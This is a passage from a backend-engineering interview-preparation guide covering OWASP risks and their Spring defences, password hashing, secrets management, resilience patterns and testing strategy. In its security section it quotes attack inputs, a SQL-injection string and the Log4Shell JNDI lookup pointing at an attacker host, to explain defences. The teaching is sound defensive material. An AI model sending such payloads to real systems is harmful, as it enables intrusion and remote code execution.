If asked "How would you design permissions for a multi-tenant SaaS?": a tenant id in the token; **every** query scoped by tenant (row-level security in Postgres as defence in depth); roles per tenant; fine-grained checks in services; audit logs; and tests for cross-tenant access. Mention Postgres RLS (`CREATE POLICY … USING (tenant_id = current_setting('app.tenant')::uuid)`) for bonus points.

### OWASP Top 10 for backend engineers

#### Core idea
The **OWASP Top 10** (and the OWASP **API Security** Top 10) lists the most critical web and API security risks. Backend interviews expect you to know the common attacks and the concrete defences in your stack.

#### How it works
| Risk | Attack | Defence in Spring/Java |
|---|---|---|
| **Broken access control / BOLA (IDOR)** | change the id in the URL to read others' data | ownership checks in queries, `@PreAuthorize`, deny by default |
| **Injection (SQL, NoSQL, command, LDAP)** | `' OR 1=1 --` in input | **parameterised queries** (JPA parameters, `PreparedStatement`); never concatenate SQL; validate inputs |
| **Cryptographic failures** | plaintext passwords, weak TLS | bcrypt/argon2 for passwords, TLS 1.2+, encryption at rest, no secrets in logs |
| **Broken authentication** | credential stuffing, weak sessions | rate limiting, MFA, lockout/backoff, secure token handling |
| **XSS** | injected script runs in other users' browsers | output encoding (templates auto-escape), a **Content-Security-Policy** header, sanitising rich text, HttpOnly cookies |
| **CSRF** | a malicious site triggers authenticated requests via cookies | CSRF tokens, SameSite cookies, bearer tokens instead of cookies |
| **SSRF** | server fetches an attacker-chosen URL (e.g. the cloud metadata `169.254.169.254`) | allowlist destinations, block internal IP ranges, IMDSv2 on AWS |
| **Security misconfiguration** | exposed actuator, verbose errors, default creds | lock down `/actuator/*`, generic error messages, hardened images |
| **Vulnerable components** | Log4Shell (CVE-2021-44228) | dependency scanning (Dependabot, Snyk, OWASP Dependency-Check), fast patching |
| **Insecure deserialization** | crafted serialized objects lead to RCE | never deserialize untrusted Java serialization; Jackson without default typing |
| **Mass assignment** | client sends `"role":"ADMIN"` in the JSON body | separate request DTOs; never bind requests directly to entities |
| **Unrestricted resource consumption** | huge payloads, unbounded queries | request size limits, pagination caps, rate limits, timeouts |

```java
// ❌ SQL injection
jdbc.query("SELECT * FROM users WHERE email = '" + email + "'", mapper);
// ✅ parameterised
jdbc.query("SELECT * FROM users WHERE email = ?", mapper, email);
// ❌ JPQL concatenation is injectable too; ✅ use :params
```

#### Real-world example
**Log4Shell (Dec 2021)**: a log message containing `${jndi:ldap://attacker/a}` made Log4j 2 fetch and execute remote code. Any service logging a user-controlled header (User-Agent!) was vulnerable. Lessons: dependency inventory (SBOM), the ability to patch within hours, egress restrictions (the outbound LDAP connection was needed for the exploit) and defence in depth.

#### Interview questions
?? How do you prevent SQL injection in a Spring Boot app?
Use parameter binding everywhere: Spring Data derived queries, `@Query` with named parameters, JdbcTemplate with `?`, the Criteria API. Never concatenate user input into SQL, JPQL or ORDER BY clauses. For dynamic sort columns, map them through an allowlist. Use least-privilege DB users and validate input types.

?? What is SSRF, and why is it dangerous in the cloud?
Server-Side Request Forgery: the server is tricked into making requests to attacker-chosen URLs (a "fetch preview from URL" feature, webhooks, PDF renderers). In the cloud the target is often the instance metadata service, which returns IAM credentials (the Capital One 2019 breach). Defences: allowlist hosts, resolve and block private and link-local IPs (watch for DNS rebinding), enforce IMDSv2, and give the instance role least privilege.

#### Tricky questions
?? Is using JPA automatically safe from SQL injection?
No. JPQL or native queries built by string concatenation are injectable, and so are dynamic `ORDER BY` columns from user input. Only bound parameters are safe.

?? Why is binding a request body directly to a JPA entity a security issue?
Mass assignment: the client can set fields it shouldn't (`isAdmin`, `balance`, `ownerId`) if they exist on the entity. Use dedicated request DTOs with only the allowed fields.

#### Interview simulation
If asked "How do you make sure your service is secure?", give layers: secure coding (parameterised queries, DTOs, output encoding), authn/authz (OAuth, ownership checks), transport (TLS, mTLS internally), secrets management, dependency scanning in CI, a hardened runtime (non-root container, read-only filesystem, minimal image), rate limiting and WAF, logging without PII, and periodic pen tests or threat modelling. Then one concrete example from your work.

### Password hashing and secrets management

#### Core idea
- **Passwords** must never be stored in plaintext or with fast hashes (MD5, SHA-256). Store them with a **slow, salted, adaptive hash**: bcrypt, scrypt or **Argon2id**, so stolen databases are expensive to crack.
- **Secrets** (DB passwords, API keys, signing keys) must never live in source code or images. Inject them at runtime from a secret manager, with rotation and least privilege.

#### How it works
**Password hashing**
- **Salt**: a random per-user value combined with the password before hashing. It defeats rainbow tables and makes identical passwords hash differently. bcrypt embeds the salt in its output (`$2a$12$<salt><hash>`).
- **Work factor**: a cost parameter (bcrypt cost 10–12; Argon2 memory and iterations) tuned so one hash takes about 100–250ms on your servers. Raise it over time (rehash on login).
- **Argon2id** is memory-hard, which resists GPU and ASIC cracking. It's the current OWASP recommendation; bcrypt is still acceptable.
- **Pepper**: an optional server-side secret (in an HSM or secret manager) added to all hashes.
- Compare using constant-time functions (avoids timing attacks); `PasswordEncoder.matches` does this.

```java
@Bean PasswordEncoder passwordEncoder() {
    return PasswordEncoderFactories.createDelegatingPasswordEncoder();   // stores "{bcrypt}$2a$10$..." → upgradeable
}
```

**Secrets management**
- Sources: AWS Secrets Manager / SSM Parameter Store, HashiCorp Vault, GCP Secret Manager, Kubernetes Secrets (base64, **not encrypted by default**, so enable etcd encryption or use External Secrets Operator or a CSI driver).
- Access via **IAM roles** (IRSA on EKS, task roles on ECS), never long-lived access keys.
- **Rotation**: automatic DB credential rotation (Vault dynamic secrets, RDS rotation) and apps that reload or retry on auth failure.
- Never log secrets (mask in Actuator `/env`, scrub logs), and scan repos for leaked secrets (gitleaks, GitHub secret scanning).
- Encryption keys live in a **KMS**; use envelope encryption for data (a data key encrypted by a master key).

#### Real-world example
NeuronixAI deployed on ECS/Fargate: the OpenAI API key and DB password come from AWS Secrets Manager, injected into the task definition as `secrets` (resolved at container start using the **task execution role**). The app never sees AWS credentials, and the key isn't in the image or the repo.

#### Interview questions
?? Why not just use SHA-256 with a salt for passwords?
SHA-256 is designed to be **fast**: billions of guesses per second on GPUs. Salts stop precomputed tables but not brute force. Password hashes must be deliberately slow and preferably memory-hard (bcrypt, scrypt, Argon2id) with a tunable cost.

?? A developer accidentally committed an AWS key to GitHub. What do you do?
**Revoke or rotate it immediately**: removing the commit isn't enough (forks, caches and bots scrape GitHub within minutes). Check CloudTrail for usage of the key, assess the damage, clean the history (BFG / git filter-repo), add secret scanning pre-commit hooks and CI checks, and move to role-based credentials so long-lived keys aren't needed.

#### Tricky questions
?? bcrypt silently truncates passwords. What's the issue?
bcrypt only uses the first 72 bytes of input. Very long passwords or passphrases (or a pepper prepended to them) may be truncated. Argon2 doesn't have this limit; or pre-hash with SHA-256 (base64-encoded) before bcrypt, carefully.

#### Interview simulation
If asked "How do you store user passwords?": Argon2id or bcrypt via Spring's `DelegatingPasswordEncoder` (so algorithms can be upgraded, with rehash on login), per-user salt (built in), cost tuned to about 200ms, rate limiting and lockout on login, breached-password checks (HaveIBeenPwned k-anonymity API), and MFA for sensitive accounts.

## Resilience & testing | P3

### Resilience patterns: timeouts, retries, circuit breakers, bulkheads

#### Core idea
In distributed systems, dependencies **will** be slow or down. Resilience patterns stop one failing dependency from taking your whole service down (**cascading failure**), and let you degrade gracefully.

#### How it works
1. **Timeouts** (the most important and most forgotten): every network call needs a connect timeout *and* a read timeout. Default HTTP clients may wait forever. Set them from the downstream's p99 plus margin, and keep the total under your own SLO.
2. **Retries** with **exponential backoff + jitter**: retry only **transient** errors (timeouts, 503, connection reset) on **idempotent** operations, with a small max (2–3). Without jitter, synchronised retries cause **retry storms**. Use a **retry budget** (e.g. retries ≤ 10% of requests) to avoid amplifying an outage; retries at every layer multiply (3 layers × 3 retries = 27× load).
3. **Circuit breaker**: track failures. When the failure rate exceeds a threshold, **open** (fail fast for a cool-down period without calling the downstream), then **half-open** (let a few trial calls through), then **closed** if they succeed. It protects both you (no threads waiting on a dead service) and the downstream (time to recover).
```
CLOSED --failure rate > 50% over window--> OPEN --wait 30s--> HALF_OPEN --trial calls ok--> CLOSED
                                                               └--trial calls fail--> OPEN
```
4. **Bulkhead**: isolate resources per dependency (a separate thread pool or semaphore), so a slow recommendation service can't consume all the threads needed for checkout.
5. **Fallbacks / graceful degradation**: cached or stale data, default values, hiding non-critical features (show the product without reviews).
6. **Rate limiting / load shedding**: reject excess load early (429/503) rather than collapsing.

```java
@CircuitBreaker(name = "pricing", fallbackMethod = "cachedPrice")
@Retry(name = "pricing")
@TimeLimiter(name = "pricing")
public CompletableFuture<Price> price(String sku) { return CompletableFuture.supplyAsync(() -> client.price(sku), io); }

private CompletableFuture<Price> cachedPrice(String sku, Throwable t) { return CompletableFuture.completedFuture(priceCache.getStale(sku)); }
```
```yaml
resilience4j:
  circuitbreaker.instances.pricing: { slidingWindowSize: 50, failureRateThreshold: 50, waitDurationInOpenState: 30s, slowCallDurationThreshold: 500ms }
  retry.instances.pricing: { maxAttempts: 3, waitDuration: 100ms, enableExponentialBackoff: true, randomizedWaitFactor: 0.5 }
```
(Annotation order matters: in Resilience4j the default aspect order is Retry(CircuitBreaker(RateLimiter(TimeLimiter(Bulkhead(fn))))).)

#### Real-world example
The Tata 1mg search page called offers, ratings and stock. When the offers service degraded, without timeouts every search request waited 30s, Tomcat threads were exhausted, and **search went down too**. With a 150ms timeout, a circuit breaker, and a fallback of "no offers shown", search stayed up, with slightly less information. That's the cascading-failure story to tell.

#### Interview questions
?? Explain the circuit breaker states.
Closed: calls pass and outcomes are recorded. Open: calls fail immediately (or use the fallback) for a wait duration once failures or slow calls exceed a threshold. Half-open: a limited number of trial calls go through; success closes the circuit, failure reopens it. It prevents wasting resources on a dead dependency and gives it time to recover.

?? When should you NOT retry?
Non-idempotent operations without idempotency keys (risk of duplicates); non-transient errors (400, 401, 404, validation); when the downstream is overloaded (retries make it worse, which is when a circuit breaker should open); when you're out of time budget; and when an upper layer already retries.

?? What is a bulkhead and why is it useful?
Named after ship compartments: you isolate resources so a failure in one area can't sink everything. For example, a separate bounded thread pool or semaphore per downstream. If the reviews service hangs, only the reviews pool fills up; checkout threads stay free.

#### Tricky questions
?? You set a 2s read timeout and 3 retries on a call inside an endpoint with a 1s SLO. What's wrong?
The worst case is 2s × 3 plus backoff, far beyond the SLO. The client will have given up long before, so the work is wasted. Timeouts and retries must fit within the overall **deadline**; propagate the remaining budget downstream (gRPC deadlines, or a header).

?? Why add jitter to backoff?
Without it, all clients that failed at the same moment retry at the same moments (100ms, 200ms, 400ms…), hitting the recovering service in synchronised waves (thundering herd). Random jitter spreads the retries out.

#### Interview simulation
**Interviewer:** "A downstream service your API depends on becomes very slow. What happens, and how do you design for it?"

**Clarify:** "Is the dependency critical to the response, or optional? What's our latency SLO? Do we have cached data we could serve?"

**Answer:** Without protection: threads block, the pool is exhausted, latency rises across all endpoints, upstream callers time out and retry, and the failure cascades. Design: timeouts fitted to the SLO, limited retries with jitter (idempotent only), a circuit breaker, a bulkhead per dependency, a fallback (stale cache or default), and alerting on breaker state. For critical dependencies, discuss async processing via a queue so we accept the request and complete it later. Bring in your 1mg experience.

### Unit testing with JUnit 5 and Mockito

#### Core idea
**Unit tests** verify a small piece of logic (a class or method) in isolation: fast (milliseconds), deterministic, and run on every build. Mockito replaces collaborators with **test doubles** so you test only the unit.

#### How it works
```java
@ExtendWith(MockitoExtension.class)
class CheckoutServiceTest {
    @Mock InventoryClient inventory;
    @Mock PaymentGateway gateway;
    @InjectMocks CheckoutService service;

    @Test
    void releasesStockWhenPaymentFails() {
        when(inventory.reserve("SKU1", 2)).thenReturn(true);
        when(gateway.charge(any())).thenThrow(new PaymentDeclinedException("insufficient funds"));

        assertThatThrownBy(() -> service.checkout(cartWith("SKU1", 2)))
            .isInstanceOf(PaymentDeclinedException.class);

        verify(inventory).release("SKU1", 2);            // the behaviour that matters
        verifyNoMoreInteractions(gateway);
    }

    @ParameterizedTest
    @CsvSource({"0,false", "1,true", "10,true", "11,false"})
    void validatesQuantity(int qty, boolean valid) { assertThat(validator.isValid(qty)).isEqualTo(valid); }
}
```
- **Test doubles**: *stub* (returns canned answers), *mock* (verifies interactions), *spy* (a real object with some methods stubbed), *fake* (a working lightweight implementation, e.g. an in-memory repository).
- **ArgumentCaptor** to inspect what was passed: `verify(repo).save(captor.capture()); assertThat(captor.getValue().getStatus()).isEqualTo(PAID);`
- **Good tests**: Arrange–Act–Assert, one behaviour per test, descriptive names, test *behaviour* not implementation details, no sleeps, deterministic time (inject `Clock`).
- **What not to mock**: value objects, the class under test, and types you don't own in ways that assume their behaviour (prefer integration tests for those boundaries).
- Spring slices: `@WebMvcTest` (controller + MockMvc, with `@MockitoBean` for services), `@DataJpaTest` (repositories), `@JsonTest`.

#### Real-world example
Injecting `java.time.Clock` instead of calling `Instant.now()` makes expiry logic (tokens, coupons, soft TTL in your Redis cache) testable: `Clock.fixed(...)` in tests, `Clock.systemUTC()` in production. Interviewers like this detail because it shows testability-driven design.

#### Interview questions
?? Mock vs stub vs spy?
A stub provides predetermined responses (state-based testing). A mock is set up with expectations and verified for interactions (behaviour-based). A spy wraps a real object, calling real methods unless stubbed. Use them sparingly, since over-mocking couples tests to implementation.

?? How do you test code that depends on the current time or randomness?
Inject the dependency: `Clock` for time, a `Random`/`Supplier<UUID>` or `IdGenerator` for randomness. Tests supply fixed values. Avoid static calls like `LocalDate.now()` or `UUID.randomUUID()` deep inside logic.

#### Tricky questions
?? Your test passes, but the code is broken in production because the mocked repository behaves differently from the real DB. What does that tell you?
Mocks verify your assumptions, not reality. Persistence, serialization, SQL, transactions and constraints need **integration tests** against the real technology (Testcontainers). Keep unit tests for pure logic and integration tests for boundaries.

#### Interview simulation
If asked to write tests in an LLD or machine-coding round: write 3–5 focused tests for the core logic and edge cases (empty input, boundary values, error path), name them by behaviour, and say how you'd test concurrency (a stress test with an `ExecutorService` and a `CountDownLatch` start gate, asserting invariants). It shows engineering maturity beyond "it compiles".

### Integration testing with Testcontainers

#### Core idea
**Integration tests** check that your code works with real infrastructure: the database, Kafka, Redis, HTTP serialisation, security config. **Testcontainers** starts real dependencies in Docker for the test run, so you test against Postgres rather than H2 and the results are trustworthy.

#### How it works
```java
@SpringBootTest(webEnvironment = RANDOM_PORT)
@Testcontainers
class OrderApiIT {
    @Container @ServiceConnection
    static PostgreSQLContainer<?> pg = new PostgreSQLContainer<>("postgres:16-alpine");
    @Container @ServiceConnection
    static KafkaContainer kafka = new KafkaContainer(DockerImageName.parse("apache/kafka:3.7.0"));

    @Autowired TestRestTemplate http;

    @Test
    void placingOrderPersistsAndPublishesEvent() {
        var resp = http.postForEntity("/v1/orders", sampleOrder(), OrderDto.class);
        assertThat(resp.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        // assert DB row exists and an OrderPlaced event arrives on the topic (Awaitility for async)
        await().atMost(Duration.ofSeconds(10)).until(() -> consumedEvents.contains(resp.getBody().id()));
    }
}
```
- `@ServiceConnection` (Boot 3.1+) wires the container's URL and credentials automatically.
- **Speed tips**: share containers across test classes (static singleton containers), reuse them locally (`testcontainers.reuse.enable=true`), use slices where possible, and run ITs in a separate Maven phase (failsafe).
- **WireMock** stubs external HTTP APIs (payment gateways), including failure modes (delays, 500s) for resilience tests.
- **Why not H2?** Different SQL dialect, different locking and isolation behaviour, no Postgres-specific features (JSONB, `SKIP LOCKED`, pgvector). Tests pass, production fails.
- **Contract tests** (Spring Cloud Contract, Pact) verify that provider and consumer agree on the API without deploying both together.

#### Real-world example
For NeuronixAI, a Testcontainers test using the `pgvector/pgvector:pg16` image validates that your Flyway migrations run, that the vector index works, and that similarity search returns the expected chunks: things H2 can't even express.

#### Interview questions
?? What's the testing pyramid, and how do you apply it to a microservice?
Many fast unit tests (logic), fewer integration tests (DB, Kafka and HTTP boundaries with Testcontainers or WireMock), a few end-to-end tests (critical user journeys in a staging environment), plus contract tests between services. The aim is fast feedback with confidence: most bugs are caught cheaply, and boundaries are tested for real.

?? How do you test a Kafka consumer?
An integration test with a Kafka Testcontainer: produce a message, then use Awaitility to wait until the side effect appears (a DB row), with no `Thread.sleep`. Also test failure paths: a poison message lands in the DLT, and redelivery is idempotent (send the same message twice and assert a single effect).

#### Tricky questions
?? Your integration tests are flaky. Common causes?
Shared mutable state between tests (data not cleaned; use unique ids per test or truncate tables), timing assumptions (sleeps instead of awaiting conditions), test-order dependence, real external services, time zones or `now()`, and port conflicts. Fix the root cause; don't just retry.

#### Interview simulation
If asked "How do you ensure quality before release?": unit tests in CI, Testcontainers ITs for data and messaging, contract tests for APIs, static analysis and dependency scanning, a code review checklist, staging with production-like data volume, canary releases with automated rollback on error-rate increase, and feature flags. A layered answer shows ownership "from design to production support", as your resume says.

### Testing strategy and the test pyramid

#### Core idea
A testing strategy decides **what to test at which level** so that you get maximum confidence for minimum time and maintenance. The classic **test pyramid**: many unit tests, fewer integration tests, very few end-to-end tests.

#### How it works
```
          /\        E2E / UI (few): critical journeys in staging
         /  \
        /----\      Contract tests: API agreements between services
       /      \
      /--------\    Integration (some): DB, Kafka, Redis, HTTP via Testcontainers/WireMock
     /          \
    /------------\  Unit (many): pure logic, fast, isolated
```
- **Unit**: business rules, calculations, state machines, validators.
- **Integration**: repositories and queries, migrations, serialization, security config, messaging.
- **Contract**: consumer-driven contracts (Pact) keep teams independent.
- **E2E**: smoke tests for "can a user place an order"; slow and brittle, so keep them minimal.
- **Non-functional**: load tests (k6, Gatling, JMeter), chaos tests, security scans.
- **In production**: canary analysis, synthetic monitoring, feature flags, and "testing in production" with observability.

Metrics: coverage is a *signal*, not a goal (80% line coverage can still miss every edge case). Mutation testing (PIT) measures whether tests actually catch bugs.

#### Real-world example
A team with mostly E2E tests had a 45-minute CI run and constant flakiness, so developers ignored failures. Rebalancing (unit tests for logic, Testcontainers for DB queries, 10 E2E smoke tests) brought CI to 8 minutes, and red builds were trusted again.

#### Interview questions
?? What would you test in a payment service?
Unit: amount calculations (paise, rounding, currency), state transitions (CREATED → AUTHORIZED → CAPTURED → REFUNDED, with invalid transitions rejected), idempotency logic. Integration: persistence plus a unique idempotency key under concurrent requests, outbox event publishing, PSP client against WireMock (timeouts, 5xx, duplicate webhook delivery). Contract: the API for the checkout service. Load: throughput at peak and the latency SLO. Chaos: PSP down → circuit opens → orders marked pending and reconciled later.

#### Tricky questions
?? Is 100% code coverage a good goal?
No. It encourages trivial tests of getters and mocks-of-mocks, and still doesn't prove correctness (assertions may be weak). Aim for high coverage of critical logic, test the edge cases, and use mutation testing to check test strength.

#### Interview simulation
If asked "How do you test a feature end to end before shipping?", walk through the levels for that specific feature, including how you'd test failure modes and concurrency, then how you'd roll it out safely (feature flag, canary, metrics to watch, rollback plan).
